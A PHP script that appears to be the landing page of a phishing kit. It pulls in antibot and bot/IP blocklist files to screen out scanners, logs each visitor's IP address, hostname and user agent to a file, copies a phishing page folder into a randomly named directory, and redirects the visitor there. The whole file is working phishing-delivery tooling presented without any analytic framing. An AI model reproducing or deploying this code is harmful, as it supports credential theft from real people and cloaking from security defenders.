<?php
    include(__DIR__ . '/files/boot/check.php');
    include(__DIR__ . '/files/boot/check1.php');
    include(__DIR__ . '/files/boot/check2.php');
    include(__DIR__ . '/files/boot/antibot.php');
    include(__DIR__ . '/files/boot/DB-BOTS.php');
    include(__DIR__ . '/files/boot/DB-CIDR.php');
    include(__DIR__ . '/files/boot/DB-HOSTS.php');
    include(__DIR__ . '/files/boot/DB-METHOD.php');
    include(__DIR__ . '/files/boot/DB-RANGE.php');
    include_once __DIR__ . '/delete.php';
	
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$time = date('Y-m-d H:i:s');
$random = md5($time);

$logfile= 'log.html'; 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$logdetails= date("F j, Y, g:i a") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>'; 
$fp = fopen($logfile, "a+");
fwrite($fp, $logdetails);
fclose($fp);


$random2=rand(0,100000000000);
$randomlink = md5($random2);


for ($DIR = '', $i = 0, $do_ll = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$do_ll), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./ids/".$randomlink.$DIR;
$khkhkhkhkhkhkh="ax";
function recurse_copy($khkhkhkhkhkhkh,$DIR) {
$dir = opendir($khkhkhkhkhkhkh);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($khkhkhkhkhkhkh . '/' . $file) ) {
recurse_copy($khkhkhkhkhkhkh . '/' . $file,$DIR . '/' . $file);
}
else {
copy($khkhkhkhkhkhkh . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $khkhkhkhkhkhkh, $DIR );


header("Location: $DIR");

?>

